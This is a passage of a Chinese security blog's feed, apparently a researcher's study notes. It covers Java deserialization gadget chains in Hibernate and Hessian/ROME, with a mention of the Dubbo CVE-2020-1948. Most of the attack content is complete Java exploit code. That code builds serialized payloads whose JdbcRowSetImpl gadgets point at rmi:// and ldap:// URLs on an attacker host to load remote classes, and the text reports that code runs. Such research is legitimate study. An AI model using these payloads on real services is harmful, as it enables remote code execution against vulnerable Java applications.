function_">createWithConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span><span class="params">(Class&lt;T&gt; classToInstantiate)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; componentTypeClass             = Class.forName(<span class="string">&quot;org.hibernate.type.ComponentType&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; pojoComponentTuplizerClass     = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; abstractComponentTuplizerClass = Class.forName(<span class="string">&quot;org.hibernate.tuple.component.AbstractComponentTuplizer&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成JdbcRowxxx</span></span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        rs.setDataSourceName(<span class="string">&quot;rmi://192.168.142.129:9999/evilclass&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> JdbcRowSetImpl.class.getDeclaredMethod(<span class="string">&quot;getDatabaseMetaData&quot;</span>);</span><br><span class="line">        Object getter;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 GetterMethodImpl 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       getterImpl  = Class.forName(<span class="string">&quot;org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = getterImpl.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(<span class="literal">null</span>, <span class="literal">null</span>, method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">            <span class="comment">// 创建 BasicGetter 实例，用来触发 TemplatesImpl 的 getOutputProperties 方法</span></span><br><span class="line">            Class&lt;?&gt;       basicGetter = Class.forName(<span class="string">&quot;org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; constructor = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            getter = constructor.newInstance(rs.getClass(), method, <span class="string">&quot;databaseMetaData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 PojoComponentTuplizer 实例，用来触发 Getter 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tuplizer</span> <span class="operator">=</span> createWithoutConstructor(pojoComponentTuplizerClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将 BasicGetter 写入 PojoComponentTuplizer 的成员变量 getters 里</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> abstractComponentTuplizerClass.getDeclaredField(<span class="string">&quot;getters&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> Array.newInstance(getter.getClass(), <span class="number">1</span>);</span><br><span class="line">        Array.set(getters, <span class="number">0</span>, getter);</span><br><span class="line">        field.set(tuplizer, getters);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 ComponentType 实例，用来触发 PojoComponentTuplizer 的 getPropertyValues 方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">type</span> <span class="operator">=</span> createWithoutConstructor(componentTypeClass);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射将相关值写入，满足 ComponentType 的 getHashCode 调用所需条件</span></span><br><span class="line">        setFieldValue(type,<span class="string">&quot;componentTuplizer&quot;</span>,tuplizer);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertySpan&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        setFieldValue(type,<span class="string">&quot;propertyTypes&quot;</span>,<span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;(Type) type&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建 TypedValue 实例，用来触发 ComponentType 的 getHashCode 方法</span></span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">typedValue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>((Type) type, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建反序列化用 HashMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(typedValue, <span class="string">&quot;su18&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// put 到 hashmap 之后再反射写入，防止 put 时触发</span></span><br><span class="line">        setFieldValue(typedValue,<span class="string">&quot;value&quot;</span>,rs);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230714002402940.png" alt="image-20230714002402940"></p><p><img src="../images/image-20230714002411609.png" alt="image-20230714002411609"></p><p><strong>这样就能执行了   (只是比较慢)</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/04/02/%E6%88%91%E6%9D%A5%E5%AF%B9Hibernate%E5%88%A9%E7%94%A8%E9%93%BE%E8%AF%B4%E4%B8%80%E4%BA%8C/&quot;&gt;参考链</summary>
      
    
    
    
    
    <category term="java-Hibernate" scheme="https://ke1nys.github.io/tags/java-Hibernate/"/>
    
  </entry>
  
  <entry>
    <title>show-JWT</title>
    <link href="https://ke1nys.github.io/posts/fb5deb43.html"/>
    <id>https://ke1nys.github.io/posts/fb5deb43.html</id>
    <published>2023-07-10T15:10:19.000Z</published>
    <updated>2023-07-19T11:38:38.088Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="341e88597f819d950b0f5c90612b48ba043f42566158cb0c370a43fd3332b7da"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-JWT" scheme="https://ke1nys.github.io/tags/show-JWT/"/>
    
  </entry>
  
  <entry>
    <title>show-SSRF</title>
    <link href="https://ke1nys.github.io/posts/ded151a6.html"/>
    <id>https://ke1nys.github.io/posts/ded151a6.html</id>
    <published>2023-07-09T03:19:01.000Z</published>
    <updated>2023-07-10T14:06:11.088Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9292b9611376b0203a8170a1f562518caf516bdb820d1b690e6cc554e5a64e98"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-SSRF" scheme="https://ke1nys.github.io/tags/show-SSRF/"/>
    
  </entry>
  
  <entry>
    <title>java-Hessian</title>
    <link href="https://ke1nys.github.io/posts/8319cacd.html"/>
    <id>https://ke1nys.github.io/posts/8319cacd.html</id>
    <published>2023-06-25T06:40:33.000Z</published>
    <updated>2023-07-06T14:02:11.671Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1193">文章1</a>    <a href="https://su18.org/post/hessian/#xbean">文章2</a>  <a href="https://juejin.cn/post/7130570567547093023">文章3  字节</a>    <a href="http://moonflower.fun/index.php/2022/05/28/336/">文章4</a></p><p>这里前言和简介就不写了  上面给的文章写的都很清楚了   直接看就行了</p><p>(<strong>就是prc啥的  直接看上面的文章就行了</strong>)</p><p>这里的只分析链子</p><h2 id="Hessian反序列化漏洞分析"><a href="#Hessian反序列化漏洞分析" class="headerlink" title="Hessian反序列化漏洞分析"></a>Hessian反序列化漏洞分析</h2><p>Hessian反序列化漏洞的关键出在<code>HessianInput#readObject</code>，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。下面我们跟进<code>readObject()</code></p><p><code>HessianInput#readObject</code>部分代码如下</p><p><img src="../images/image-20230625153912111.png" alt="image-20230625153912111"></p><p>打个断点来进行分析</p><p><img src="../images/image-20230625153943252.png" alt="image-20230625153943252"></p><p>跟进这个<code>readMap</code>()方法</p><p><img src="../images/image-20230625154035372.png" alt="image-20230625154035372"></p><p>接着跟进这个<code>getDeserializer</code>()方法    获取反序列化的返回结果</p><p><img src="../images/image-20230625154203052.png" alt="image-20230625154203052"></p><p>在获取到<code>deserializer</code>后，java会创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入HashMap中。</p><p><strong>看过rome链子的应该能反应过来这里 </strong>    <code>hashmap</code>   <code>key</code></p><p>后续代码能够触发任意类的<code>hashcode()</code>方法</p><p><img src="../images/image-20230625160235189.png" alt="image-20230625160235189"></p><p>因为这个<code>key</code>可控</p><p>至此，我们Gadget的构造思路也就十分清晰了，只需要找一条入口为hashcode()的反序列化链即可，比如我们常用的ROME链</p><h3 id="Hessian-Rome"><a href="#Hessian-Rome" class="headerlink" title="Hessian+Rome"></a>Hessian+Rome</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>利用链如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_JNDI</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://192.168.142.129:9999/EXP&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230706165052839.png" alt="image-20230706165052839"></p><p><img src="../images/image-20230706165058207.png" alt="image-20230706165058207"></p><p>成功弹出计算器</p><h3 id="Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）"><a href="#Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）" class="headerlink" title="Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）"></a>Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</h3><p>Apache Dubbo 是一款高性能的开源Java RPC框架。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>2.7.0 &lt;= Dubbo Version &lt;= 2.7.6</li><li>2.6.0 &lt;= Dubbo Version &lt;= 2.6.7</li><li>Dubbo 所有 2.5.x 版本（官方团队目前已不支持）</li></ul><p><strong>这里的就不写了  了解一下就行了  因为搭建环境太麻烦了</strong></p><h3 id="TemplatesImpl-SignedObject二次反序列化-ROME不出网"><a href="#TemplatesImpl-SignedObject二次反序列化-ROME不出网" class="headerlink" title="TemplatesImpl+SignedObject二次反序列化(ROME不出网)"></a>TemplatesImpl+SignedObject二次反序列化(ROME不出网)</h3><p>上文我们构造的都是<code>JdbcRowSetImpl</code>这条ROME链，最终结果是造成JNDI注入。那如果目标不出网，我们又怎么利用呢？</p><p>或许你还记得ROME中的<code>TemplatesImpl</code>利用链，其能够加载任意类，进而任意代码执行。下面我们来尝试构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 